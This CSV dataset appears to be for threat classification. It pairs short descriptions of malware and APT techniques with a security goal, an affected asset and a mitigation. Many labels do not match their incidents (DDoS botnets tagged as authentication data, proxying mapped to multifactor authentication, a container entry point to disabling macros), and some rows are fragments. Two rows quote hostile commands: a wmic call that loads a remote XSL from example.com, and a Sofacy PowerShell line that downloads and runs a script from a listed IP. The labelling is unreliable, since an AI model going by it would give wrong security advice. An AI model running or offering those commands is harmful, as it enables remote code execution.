incident,goal,assets,solutions
The OsInfo function in Komplex collects a running process list.,confidentiality,users data,data loss prevention
Fysbis can collect information about running processes.,confidentiality,users data,data loss prevention
RDAT has used HTTP if DNS C2 communications were not functioning.,confidentiality,running processes,endpoint detection and response
Chaes has used the Puppeteer module to hook and monitor the Chrome web browser to collect user information from infected hosts.,confidentiality,operating system,endpoint detection and response
ThiefQuest uses various API to perform behaviors such as executing payloads and performing local enumeration.,confidentiality,users data,data loss prevention
Blue Mockingbird has made their XMRIG payloads persistent as a Windows Service.,availability,running processes,application whitelisting
"When used maliciously, LKMs can be a type of kernel-mode Rootkit that run with the highest operating system privilege .",integrity,users data,data loss prevention
Adversaries may target resource intensive features of web applications to cause a denial of service .,availability,running processes,endpoint detection and response
Pasam creates a backdoor through which remote attackers can delete files.,integrity,operating system,access controls
Okrum was seen using NetSess to discover NetBIOS sessions.,confidentiality,application software,network segmentation and filtering
Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic.,confidentiality,application software,application whitelisting
"Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out.",confidentiality,application software,application whitelisting
ShadowPad has collected the PID of a malicious process.,confidentiality,networks,network segmentation and filtering
Dok downloads and installs Tor via homebrew.,confidentiality,application software,endpoint detection and response
Adversaries may rely on a user running a malicious image to facilitate execution.,integrity,running processes,user account control
Ebury has been embedded into modified OpenSSH binaries to gain persistent access to SSH credential information.,confidentiality,authentication data,endpoint detection and response
They have also exploited CVE-2020-0688 against the Microsoft Exchange Control Panel to regain access to a network.,confidentiality,authentication data,access controls
Adversaries may rent Virtual Private Servers  that can be used during targeting.,confidentiality,users data,application whitelisting
"Lastly, the new variant of RogueRobin is capable of using the Google Drive cloud service for its C2 channel, suggesting that DarkHydrus may be shifting to abusing legitimate cloud services for their infrastructure",confidentiality,running processes,endpoint detection and response
Kwampirs downloads additional files that are base64-encoded and encrypted with another cipher.,confidentiality,authentication data,network segmentation and filtering
Kinsing was executed with an Ubuntu container entry point that runs shell scripts.,integrity,application software,disable macros
"Usage of a resource fork is identifiable when displaying a file’s extended attributes, using ls -l@ or xattr -l commands.",confidentiality,networks,network segmentation and filtering
Bankshot recursively generates a list of files within a directory and sends them back to the control server.,confidentiality,users data,endpoint detection and response
Evilnum has sent spearphishing emails designed to trick the recipient into opening malicious shortcut links which downloads a .LNK file.,confidentiality,email accounts,disable macros
APT37 has access to destructive malware that is capable of overwriting a machine's Master Boot Record .,availability,application software,disable macros
This information may also include specifics regarding network devices  and other infrastructure.,confidentiality,running processes,endpoint detection and response
"Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.",availability,authentication data,network segmentation and filtering
Avenger can extract backdoor malware from downloaded images.,confidentiality,application software,network segmentation and filtering
CopyKittens digitally signed an executable with a stolen certificate from legitimate company AI Squared.,integrity,email accounts,application whitelisting
SMOKEDHAM can execute Powershell commands sent from its C2 server.,confidentiality,users data,access controls
Kimsuky has used Visual Basic to download malicious payloads.,confidentiality,users data,access controls
Ursnif has used Reg to query the Registry for installed programs.,confidentiality,running processes,application whitelisting
"If a victim meets certain criteria, T9000 uses the AppInit_DLL functionality to achieve persistence by ensuring that every user mode process that is spawned will load its malicious DLL, ResN32.dll.",integrity,users data,application whitelisting
GALLIUM used whoami and query user to obtain information about the victim user.,confidentiality,authentication data,multifactor authentication
Using Windows Shortcut files (.lnk) in the Startup folder that invoke the Windows Scripting Host (wscript.exe) to execute a Jscript backdoor for persistence,integrity,email accounts,multifactor authentication
SpeakUp uses Python scripts.,confidentiality,running processes,application whitelisting
Equation has used an encrypted virtual file system stored in the Windows Registry.,confidentiality,users data,endpoint detection and response
"Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device.",confidentiality,operating system,endpoint detection and response
Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.,confidentiality,networks,network segmentation and filtering
"Pony has collected the Service Pack, language, and region information to send to the C2.",confidentiality,application software,network segmentation and filtering
"To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.",confidentiality,running processes,endpoint detection and response
Custom tools may also be used to gather file and directory information and interact with the Native API.,confidentiality,running processes,endpoint detection and response
"Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.",confidentiality,users data,disable macros
"With sufficient permissions, a compromised account can gain almost unlimited access to data and settings  via the global admin role.",confidentiality,authentication data,network segmentation and filtering
FYAnti can search the C:\Windows\Microsoft.NET\ directory for files of a specified size.,confidentiality,networks,endpoint detection and response
Process injection is a method of executing arbitrary code in the address space of a separate live process.,confidentiality,running processes,application whitelisting
"Command-line examples:
* Local File: wmic process list /FORMAT:evil.xsl
* Remote File: wmic os get /FORMAT:”https://example.com/evil.xsl” Astaroth executes embedded JScript or VBScript in an XSL stylesheet located on a remote domain.",integrity,users data,data loss prevention
Sandworm Team has delivered malicious Microsoft Office attachments via spearphishing emails.,confidentiality,operating system,update security patches
Downdelph uses RC4 to encrypt C2 responses.,confidentiality,networks,network segmentation and filtering
More_eggs uses HTTPS for C2.,confidentiality,operating system,application whitelisting
"The OwaAuth web shell is likely created with a builder, given that the PE compile time of the binary does not change between instances and the configuration fields are padded to a specific size",integrity,operating system,endpoint detection and response
Lucifer can use the Stratum protocol on port 10001 for communication between the cryptojacking bot and the mining server.,confidentiality,networks,endpoint detection and response
Revenge RAT uses the PowerShell command Reflection.Assembly to load itself into memory to aid in execution.,confidentiality,users data,access controls
Bandook is delivered via a malicious Word document inside a zip file.,confidentiality,authentication data,multifactor authentication
BLUELIGHT can zip files before exfiltration.,confidentiality,networks,network segmentation and filtering
The Trojan will save the output of the command to %TEMP%\win<random number>.txt and send the contents to the C2 server or “The length of Cmd result file is ziro!” if the command was unsuccessful,confidentiality,authentication data,multifactor authentication
Conficker has obfuscated its code to prevent its removal from host machines.,integrity,running processes,application whitelisting
APT18 can upload a file to the victim’s machine.,confidentiality,running processes,access controls
PowerStallion has been used to monitor process lists.,confidentiality,application software,update security patches
"Turla has obtained information on security software, including security logging information that may indicate whether their malware has been detected.",confidentiality,running processes,endpoint detection and response
Mustang Panda has used vssadmin to create a volume shadow copy and retrieve the NTDS.dit file.,confidentiality,running processes,user account control
"Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",integrity,running processes,endpoint detection and response
WIRTE has used Regsvr32.exe to trigger the execution of a malicious script.,integrity,application software,endpoint detection and response
"11 AV detection If there is no Avast install present, the script proceeds to the final .dll execution using regsvr32 and quits",confidentiality,email accounts,data loss prevention
Adversaries may search freely available technical databases for information about victims that can be used during targeting.,confidentiality,running processes,access controls
The CozyCar configuration file has been encrypted with RC4 keys.,confidentiality,running processes,network segmentation and filtering
SUNBURST attempted to disable software security services following checks against a FNV-1a + XOR hashed hardcoded blocklist.,integrity,running processes,endpoint detection and response
"Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.",confidentiality,users data,application whitelisting
The White Company has sent phishing emails with malicious Microsoft Word attachments to victims.,confidentiality,networks,network segmentation and filtering
/sbin/emond ,confidentiality,application software,disable macros
"After encrypting its own log files, the log encryption module in Prikormka deletes the original, unencrypted files from the host.",confidentiality,networks,firewall rules harden
"Systemd timers may be activated remotely via the systemctl command line utility, which operates over SSH.",confidentiality,application software,application whitelisting
AppleJeus has required user execution of a malicious MSI installer.,confidentiality,application software,update security patches
CosmicDuke steals user files from network shared drives with file extensions and keywords that match a predefined list.,confidentiality,running processes,endpoint detection and response
Hildegard has modified DNS resolvers to evade DNS monitoring tools.,integrity,authentication data,access controls
"As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.",confidentiality,running processes,application whitelisting
"boom! Deletes GID.bin, ShwDoc.VBS and ShwDoc.srv files, as well as the scheduled task whose name a GUID stored in the GID.bin file",integrity,running processes,endpoint detection and response
Adversaries use launchctl to execute commands and programs as Launch Agents or Launch Daemons.,confidentiality,application software,network segmentation and filtering
Sibot has been executed via a scheduled task.,confidentiality,running processes,network segmentation and filtering
"The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions.",confidentiality,application software,application whitelisting
DarkHydrus leveraged PowerShell to download and execute additional scripts for execution.,integrity,operating system,endpoint detection and response
POWERSTATS can upload files from compromised hosts.,confidentiality,authentication data,network segmentation and filtering
"UNC2452 routinely removed their tools, including custom backdoors, once remote access was achieved.",confidentiality,email accounts,network segmentation and filtering
RTM monitors browsing activity and automatically captures screenshots if a victim browses to a URL matching one of a list of strings.,confidentiality,authentication data,access controls
Examples include ListObjectsV2 in AWS  and List Blobs in Azure .,confidentiality,users data,application whitelisting
Skidmap has checked for the existence of specific files including /usr/sbin/setenforce and  /etc/selinux/config.,confidentiality,application software,application whitelisting
Kazuar captures screenshots of the victim’s screen.,confidentiality,authentication data,multifactor authentication
BADNEWS creates a scheduled task to establish by executing a malicious payload every subsequent minute.,availability,authentication data,endpoint detection and response
RainyDay can use a file exfiltration tool to copy files to C:\ProgramData\Adobe\temp prior to exfiltration.,confidentiality,running processes,application whitelisting
"In macOS 11+, the use of the profiles tool can no longer install configuration profiles, however .mobileconfig files can be planted and installed with user interaction.",integrity,authentication data,endpoint detection and response
Lazarus Group leveraged Mimikatz to extract Windows Credentials of currently logged-in users and steals passwords stored in browsers.,confidentiality,users data,data loss prevention
Epic uses the tasklist /svc command to list the services on the system.,confidentiality,networks,endpoint detection and response
"Examples of events that may be subscribed to are the wall clock time, user loging, or the computer's uptime.",confidentiality,operating system,application whitelisting
"APT29 has registered algorithmically generated Twitter handles that are used for C2 by malware, such as HAMMERTOSS.",integrity,running processes,application whitelisting
"Mustang Panda has used 'adobeupdate.dat' as a PlugX loader, and a file named 'OneDrive.exe' to load a Cobalt Strike payload.",confidentiality,operating system,application whitelisting
AppleSeed can disguise JavaScript files as PDFs.,integrity,running processes,endpoint detection and response
REvil has used encrypted strings and configuration files.,confidentiality,users data,application whitelisting
PowerDuke has a command to download a file.,confidentiality,running processes,application whitelisting
"Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages   to provide a layer of abstraction between API functions and files.",availability,application software,disable macros
Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect.,confidentiality,application software,endpoint detection and response
"From the 185.25.50[.]93 C2 IP, we discovered another hard-coded user agent being used by Zebrocy: Mozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.3.8 (WinHTTP/5.1) like Gecko We observed several samples of Zebrocy using this user agent targeting the foreign affairs ministry of a large Central Asian nation",confidentiality,authentication data,application whitelisting
"Adversaries may gather this information in various ways, such as direct collection actions via Active Scanning  or Phishing for Information.",confidentiality,running processes,application whitelisting
Operation Wocao can download additional files to the infected system.,confidentiality,users data,endpoint detection and response
Attor has used FTP protocol for C2 communication.,confidentiality,authentication data,endpoint detection and response
"Specific COM objects also exist to directly perform functions beyond code execution, such as creating a Scheduled Task/Job, fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.",integrity,authentication data,endpoint detection and response
"The following shows this unused command, which exposed an additional server within Sofacy’s infrastructure would download and execute an encoded PowerShell script from 92.114.92[.]102:       C:\\Programs\\Microsoft\\MSOffice\\Word.exe\\..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -Whidden $e=(New-ObjectSystem.Net.webClient).downloadString('hxxp://92.114.92[.]102:80/d');powershell -enc $e #     The unused command above appears to be related to previous attacks, specifically attacks that occurred in November 2017 as discussed by McAfee and ESET",confidentiality,application software,application whitelisting
" 
LoadPackagedLibrary() ",confidentiality,users data,endpoint detection and response
Turian has the ability to use HTTP for its C2.,confidentiality,application software,access controls
The attackers used spear phishing emails combined with malicious HWP documents created using Hancom Hangul Office Suite,confidentiality,users data,endpoint detection and response
Cobalt Group has sent spearphishing emails with various attachment types to corporate and personal email accounts of victim organizations.,confidentiality,users data,endpoint detection and response
XCSSET uses the chmod +x command to grant executable permissions to the malicious file.,integrity,application software,application whitelisting
APT28 has used the Office Test persistence mechanism within Microsoft Office by adding the Registry key HKCU\Software\Microsoft\Office test\Special\Perf to execute code.,confidentiality,authentication data,endpoint detection and response
Ragnar Locker has attempted to terminate/stop processes and services associated with endpoint security products.,availability,running processes,endpoint detection and response
PUNCHBUGGY has used python scripts.,confidentiality,running processes,application whitelisting
Attor's dispatcher can be executed as a service.,confidentiality,application software,application whitelisting
Aria-body has the ability to gather metadata from a file and to search for file and directory names.,confidentiality,networks,network segmentation and filtering
"We recently mentioned this tool in another report on April 16, as this variant of the BONDUPDATER tool used DNS tunneling to communicate with its C2, specifically using TXT queries to receive information from the C2 server",confidentiality,application software,application whitelisting
Regin leveraged several compromised universities as proxies to obscure its origin.,confidentiality,networks,multifactor authentication
MURKYTOP has the capability to scan for open ports on hosts in a connected network.,confidentiality,email accounts,endpoint detection and response
APT41 deleted files from the system.,integrity,operating system,endpoint detection and response
FIVEHANDS has the ability to enumerate files on a compromised host in order to encrypt files with specific extensions.,confidentiality,application software,application whitelisting
"Naikon has disguised malicious programs as Google Chrome, Adobe, and VMware executables.",integrity,users data,endpoint detection and response
S-Type may create a temporary user on the system named “Lost_{Unique Identifier}” with the password “pond~!,confidentiality,running processes,application whitelisting
PipeMon can use parent PID spoofing to elevate privileges.,confidentiality,networks,network segmentation and filtering
WINDSHIELD is capable of file deletion along with other file system interaction.,integrity,running processes,endpoint detection and response
An adversary may rely upon a user opening a malicious file in order to gain execution.,confidentiality,users data,endpoint detection and response
"Command and Control Infrastructure: Compromised servers, messaging platforms, and cloud service providers to avoid detection",confidentiality,users data,endpoint detection and response
In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.,confidentiality,authentication data,multifactor authentication
Leviathan has received C2 instructions from user profiles created on legitimate websites such as Github and TechNet.,confidentiality,running processes,endpoint detection and response
"Similar to RIPTIDE and HIGHTIDE, the WATERSPOUT backdoor is an HTTP-based backdoor that communicates with its C2 server",confidentiality,running processes,application whitelisting
FinFisher checks if the victim OS is 32 or 64-bit.,integrity,users data,disable macros
"MESSAGETAP checks two files, keyword_parm.txt and parm.txt, for instructions on how to target and save data parsed and extracted from SMS message data from the network traffic.",confidentiality,operating system,user account control
This behavior is distinct from Disk Content Wipe and Disk Structure Wipe because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.,integrity,application software,application whitelisting
Gamaredon Group tools can delete files used during an infection.,integrity,email accounts,multifactor authentication
Malware may also use IFEO to Impair Defenses by registering invalid debuggers that redirect and effectively disable various system and security applications.,integrity,authentication data,stronger key exchange algorithms
"Silence has sent emails with malicious DOCX, CHM, LNK and ZIP attachments.",confidentiality,running processes,application whitelisting
It also collects the system's MAC address with getmac and domain configuration with net config workstation.,confidentiality,running processes,endpoint detection and response
"System and user-wide environment variable scopes are specified in the Registry, where a Component Object Model  object can be registered as a profiler DLL.",confidentiality,users data,data loss prevention
"Volgmer can gather system information, the computer name, OS version, drive and serial information from the victim's machine.",confidentiality,application software,stronger key exchange algorithms
Gamaredon Group's malware can take screenshots of the compromised computer every minute.,confidentiality,application software,endpoint detection and response
SHOTPUT is obscured using XOR encoding and appended to a valid GIF file.,integrity,users data,data loss prevention
"When the file is executed, the ThiefQuest code is executed first.",integrity,application software,application whitelisting
Gamaredon Group has used DOCX files to download malicious DOT document templates.,integrity,running processes,application whitelisting
SMOKEDHAM has encrypted its C2 traffic with RC4.,confidentiality,application software,endpoint detection and response
APT39 has used malware to decrypt encrypted CAB files.,confidentiality,running processes,application whitelisting
SDBbot has the ability to determine the domain name and whether a proxy is configured on a compromised host.,confidentiality,running processes,application whitelisting
Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network.,confidentiality,networks,network segmentation and filtering
"Rocke has used Pastebin, Gitee, and GitLab for Command and Control.",confidentiality,running processes,application whitelisting
LD_PRELOAD can be set via the environment variable or /etc/ld.so.preload file.,integrity,networks,firewall rules harden
InvisiMole can use a modified base32 encoding to encode data within the subdomain of C2 requests.,confidentiality,networks,firewall rules harden
GALLIUM used a modified version of HTRAN to redirect connections between networks.,integrity,running processes,endpoint detection and response
Emotet has used custom packers to protect its payloads.,integrity,application software,endpoint detection and response
FIVEHANDS has the ability to delete volume shadow copies on compromised hosts.,integrity,authentication data,access controls
"InvisiMole gathers information on the IP forwarding table, MAC address, configured proxy, and network SSID.",confidentiality,authentication data,data loss prevention
NETWIRE can retrieve passwords from messaging and mail client applications.,confidentiality,authentication data,multifactor authentication
"In the event this is successful, the malware will use the following path to store any dropped files:  %COMMONPROGRAMFILES%\services\  In the event it is not successful, this alternative path will be used instead:  %APPDATA%\microsoft\mmc\  Reaver.v2 proceeds to decrypt an embedded file using a simple XOR obfuscation routine",integrity,email accounts,endpoint detection and response
"HTTPBrowser abuses the Windows DLL load order by using a legitimate Symantec anti-virus binary, VPDN_LU.exe, to load a malicious DLL that mimics a legitimate Symantec DLL, navlu.dll.",integrity,authentication data,data loss prevention
"For that we can use a Python script, included in Appendix B – Python Scripts",confidentiality,running processes,application whitelisting
HotCroissant has the ability to collect the username on the infected host.,confidentiality,users data,access controls
WastedLocker checked if UCOMIEnumConnections and IActiveScriptParseProcedure32 Registry keys were detected as part of its anti-analysis technique.,confidentiality,running processes,application whitelisting
Valak has the ability to base64 encode and XOR encrypt strings.,confidentiality,running processes,application whitelisting
"Use of compromised infrastructure allows an adversary to stage, launch, and execute an operation.",confidentiality,running processes,update security patches
"PowerDuke has commands to get the time the machine was built, the time, and the time zone.",confidentiality,running processes,endpoint detection and response
Astaroth collects information from the clipboard by using the OpenClipboard and GetClipboardData libraries.,confidentiality,running processes,application whitelisting
Stolen code signing certificates used to sign malware,integrity,application software,application whitelisting
HELLOKITTY can use an embedded RSA-2048 public key to encrypt victim data for ransom.,confidentiality,application software,access controls
"Figure 3 Targeted lure content In one of the documents, the victim is presented with what appears to be an obfuscated document with the NATO EOD seal and text alluding to the targeted nation state",confidentiality,authentication data,endpoint detection and response
Zebrocy uses SSL and AES ECB for encrypting C2 communications.,confidentiality,authentication data,multifactor authentication
"Dtrack can collect the RegisteredOwner, RegisteredOrganization, and InstallDate registry values.",confidentiality,users data,data loss prevention
This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.,confidentiality,users data,endpoint detection and response
Spark can use cmd.exe to run commands.,integrity,users data,endpoint detection and response
APT41 created a RAR archive of targeted files for exfiltration.,confidentiality,users data,access controls
"Similar to Regsvr32, odbcconf.exe has a REGSVR flag that can be misused to execute DLLs .",confidentiality,networks,network segmentation and filtering
PipeMon has used a call to LoadLibrary to load its installer.,confidentiality,running processes,application whitelisting
UNC2452 removed evidence of email export requests using Remove-MailboxExportRequest.,integrity,running processes,user account control
"Zebrocy uses the tasklist and wmic process get Capture, ExecutablePath commands to gather the processes running on the system.",confidentiality,users data,endpoint detection and response
Evilnum has used malicious JavaScript files on the victim's machine.,confidentiality,email accounts,update security patches
StreamEx establishes persistence by installing a new service pointing to its DLL and setting the service to auto-start.,availability,users data,access controls
"If an adversary knows the credentials for the login keychain, then they can get access to all the other credentials stored in this vault.",confidentiality,running processes,application whitelisting
Environmental keying is an implementation of Execution Guardrails that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.,confidentiality,networks,network segmentation and filtering
MuddyWater has compromised third parties and used compromised accounts to send spearphishing emails with targeted attachments to recipients.,confidentiality,users data,endpoint detection and response
Octopus has been delivered via spearsphishing emails.,confidentiality,running processes,application whitelisting
Astaroth can check for Windows product ID's used by sandboxes and usernames and disk serial numbers associated with analyst environments.,integrity,operating system,network segmentation and filtering
Adversaries may modify file time attributes to hide new or changes to existing files.,integrity,running processes,endpoint detection and response
njRAT can access the victim's webcam.,confidentiality,running processes,application whitelisting
Sandworm Team has disabled event logging on compromised systems.,integrity,operating system,endpoint detection and response
"DarkHydrus used an open-source tool, Phishery, to inject malicious remote template URLs into Microsoft Word documents and then sent them to victims to enable Forced Authentication.",confidentiality,running processes,application whitelisting
"Magic Hound has obtained and used open-source penetration testing tools like Havij, sqlmap, Metasploit, and Mimikatz.",confidentiality,application software,update security patches
W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.,integrity,users data,data loss prevention
"There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code      
Mshta.exe is a utility that executes Microsoft HTML Applications  files.",availability,running processes,application whitelisting
Extensible Stylesheet Language  files are commonly used to describe the processing and rendering of data within XML files.,confidentiality,networks,stronger key exchange algorithms
TrickBot has used printf and file I/O loops to delay process execution as part of API hammering.,confidentiality,operating system,endpoint detection and response
"APT28 has used IMAP, POP3, and SMTP for a communication channel in various implants, including using self-registered Google Mail accounts and later compromised email servers of its victims.",confidentiality,authentication data,multifactor authentication
Ursnif has used tmp files to stage gathered information.,confidentiality,running processes,endpoint detection and response
"For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.",integrity,users data,endpoint detection and response
Twitoor uses Twitter for command and control.,confidentiality,running processes,application whitelisting
Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code.,availability,operating system,application whitelisting
"Inception used a browser plugin to steal passwords and sessions from Internet Explorer, Chrome, Opera, Firefox, Torch, and Yandex.",confidentiality,users data,stronger key exchange algorithms
Cobalt Group has used HTTPS for C2.,confidentiality,operating system,endpoint detection and response
OopsIE also encodes collected data in hexadecimal format before writing to files on disk and obfuscates strings.,confidentiality,running processes,endpoint detection and response
Grandoreiro can identify installed security tools based on window names.,confidentiality,operating system,endpoint detection and response
Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers.,confidentiality,running processes,endpoint detection and response
TrickBot can gather information about domain trusts by utilizing Nltest.,confidentiality,application software,application whitelisting
Adversaries can use LKMs and kexts to covertly persist on a system and elevate privileges.,confidentiality,email accounts,endpoint detection and response
"Cobalt Group used the Ammyy Admin tool as well as TeamViewer for remote access, including to preserve remote access if a Cobalt Strike module was lost.",confidentiality,networks,network segmentation and filtering
Adversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory.,confidentiality,users data,data loss prevention
Mivast creates the following Registry entry: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Micromedia.,integrity,running processes,application whitelisting
An older variant of PLAINTEE performs UAC bypass.,integrity,users data,data loss prevention
Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol  server.,integrity,application software,stronger key exchange algorithms
LightNeuron gathers information about network adapters using the Win32 API call GetAdaptersInfo.,confidentiality,users data,data loss prevention
The Performance key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.,integrity,operating system,application whitelisting
Emotet has been seen exfiltrating system information stored within cookies sent within an HTTP GET request back to its C2 servers.,confidentiality,application software,application whitelisting
Patchwork bypassed User Access Control .,integrity,networks,endpoint detection and response
Egregor has used multiple anti-analysis and anti-sandbox techniques to prevent automated analysis by sandboxes.,confidentiality,application software,access controls
"The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses.",confidentiality,operating system,access controls
Encryption consists of XOR with a hardcoded key for its configuration and RC4 with a predefined password for encrypting the victim’s data,confidentiality,application software,network segmentation and filtering
"The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset.",confidentiality,authentication data,network segmentation and filtering
A module in Prikormka collects information from the victim about the current user name.,confidentiality,running processes,endpoint detection and response
Lucifer can collect the IP address of a compromised host.,confidentiality,application software,update security patches
"Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.",confidentiality,operating system,application whitelisting
"Once malicious rules have been added to the user’s mailbox, they will be loaded when Outlook is started.",confidentiality,application software,application whitelisting
AutoIt backdoor downloads a PowerShell script that decodes to a typical shellcode loader.,confidentiality,users data,disable macros
DropBook can execute arbitrary shell commands on the victims' machines.,confidentiality,application software,application whitelisting
"Winnti for Linux has used ICMP, custom TCP, and UDP in outbound communications.",confidentiality,operating system,endpoint detection and response
WINERACK can gather information on the victim username.,confidentiality,authentication data,user account control
Agent Tesla has the ability to steal credentials from FTP clients and wireless profiles.,confidentiality,networks,network segmentation and filtering
Adversaries may make modifications to client software binaries to carry out malicious tasks when those applications are in use.,integrity,authentication data,multifactor authentication
httpclient uses HTTP for command and control.,confidentiality,users data,update security patches
"An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.",confidentiality,authentication data,endpoint detection and response
Kwampirs collects a list of available servers with the command net view.,confidentiality,application software,application whitelisting
"The technique of having a signed, legitimate, executable load a malicious library is commonly referred to as side-loading, and has been witnessed in a number of campaigns and malware families in the past",integrity,operating system,application whitelisting
"FIN7 malware has created Registry Run and RunOnce keys to establish persistence, and has also added items to the Startup folder.",integrity,networks,network segmentation and filtering
Create Service,availability,users data,access controls
TYPEFRAME can execute commands using a shell.,integrity,operating system,endpoint detection and response
NETWIRE can use XDG Autostart Entries to establish persistence.,integrity,running processes,endpoint detection and response
Ixeshe can collect data from a local system.,confidentiality,users data,data loss prevention
ROKRAT can request to upload collected host data and additional files.,confidentiality,users data,access controls
"Within cloud environments, adversaries may attempt to discover services running on other cloud hosts.",confidentiality,application software,disable macros
Bandook has modules that are capable of capturing audio.,confidentiality,authentication data,endpoint detection and response
and then deletes the original launcher,confidentiality,operating system,application whitelisting
ComRAT has used cmd.exe to execute commands.,confidentiality,running processes,endpoint detection and response
Fox Kitten has used PowerShell scripts to access credential data.,confidentiality,users data,data loss prevention
"Using rundll32.exe, vice executing directly  Shared Modules, may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations.",integrity,authentication data,multifactor authentication
Adversaries may attempt to get a listing of domain accounts.,confidentiality,networks,network segmentation and filtering
APT3 has a tool that can enumerate current network connections.,confidentiality,running processes,endpoint detection and response
Revenge RAT uses Base64 to encode information sent to the C2 server.,confidentiality,operating system,application whitelisting
"Its encoding method has been modified from time to time, aligned with major upgrade of PlugX itself",confidentiality,networks,network segmentation and filtering
SYSCON has the ability to use Tasklist to list running processes.,confidentiality,application software,endpoint detection and response
Bundlore can execute JavaScript by injecting it into the victim's browser.,integrity,running processes,network segmentation and filtering
"The email contained an attachment named Seminar-Invitation.doc, which is a malicious Microsoft Word document we track as ThreeDollars",integrity,users data,endpoint detection and response
It will also gather the username of running processes to determine if it is running as SYSTEM.,confidentiality,running processes,endpoint detection and response
ZLib communicates over HTTP for C2.,confidentiality,application software,application whitelisting
StrongPity has used encrypted strings in its dropper component.,confidentiality,running processes,network segmentation and filtering
GrimAgent can delete old binaries on a compromised host.,integrity,authentication data,multifactor authentication
Machete is written in Python and is used in conjunction with additional Python scripts.,confidentiality,running processes,application whitelisting
"In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster.",integrity,users data,application whitelisting
Adversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the RunAtLoad or KeepAlive keys set to true.,availability,authentication data,multifactor authentication
FIN8 aggregates staged data from a network into a single location.,confidentiality,running processes,application whitelisting
Fysbis has the ability to create and execute commands in a remote shell for CLI.,confidentiality,operating system,access controls
Adversaries may also try brute forcing via Password Guessing to obtain the master password of a password manager.,confidentiality,users data,data loss prevention
APT39 has sent spearphishing emails in an attempt to lure users to click on a malicious link.,confidentiality,email accounts,disable macros
Unique SIPs exist for most file formats  and are identified by globally unique identifiers .,integrity,networks,stronger key exchange algorithms
